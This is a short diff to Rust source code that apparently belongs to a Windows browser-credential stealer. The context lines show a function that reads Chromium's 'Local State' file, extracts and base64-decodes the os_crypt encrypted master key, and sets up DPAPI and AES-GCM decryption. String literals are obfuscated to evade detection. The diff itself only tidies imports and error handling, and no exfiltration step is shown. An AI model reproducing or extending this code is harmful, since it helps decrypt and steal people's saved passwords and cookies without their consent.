@@ -1,4 +1,4 @@
-use crate::base64::{base64_decode_string};
+use crate::base64::base64_decode_string;
 use crate::path::Path;
 use alloc::string::{String, ToString};
 use alloc::vec::Vec;
@@ -7,7 +7,7 @@ use core::ptr::null_mut;
 use core::slice;
 use json::parse;
 use obfstr::obfstr as s;
-use windows_sys::Win32::Foundation::{LocalFree};
+use windows_sys::Win32::Foundation::LocalFree;
 use windows_sys::Win32::Security::Cryptography::{BCryptCloseAlgorithmProvider, BCryptDecrypt, BCryptDestroyKey, BCryptGenerateSymmetricKey, BCryptOpenAlgorithmProvider, BCryptSetProperty, CryptUnprotectData, BCRYPT_AES_ALGORITHM, BCRYPT_ALG_HANDLE, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_GCM, BCRYPT_KEY_HANDLE, CRYPT_INTEGER_BLOB};
 
 pub unsafe fn crypt_unprotect_data(data: &[u8]) -> Option<Vec<u8>> {
@@ -134,7 +134,7 @@ unsafe fn utf16_bstrlen(s: *const u16) -> usize {
 
 pub unsafe fn extract_master_key(user_data: &Path) -> Option<Vec<u8>> {
     let bytes = (user_data / s!("Local State")).read_file().ok()?;
-    let parsed = parse(&bytes).unwrap();
+    let parsed = parse(&bytes).ok()?;
 
     let key_in_base64 = parsed.get(s!("os_crypt"))?.get(s!("encrypted_key"))?.as_string()?.clone();
     let key = base64_decode_string(&key_in_base64)?;
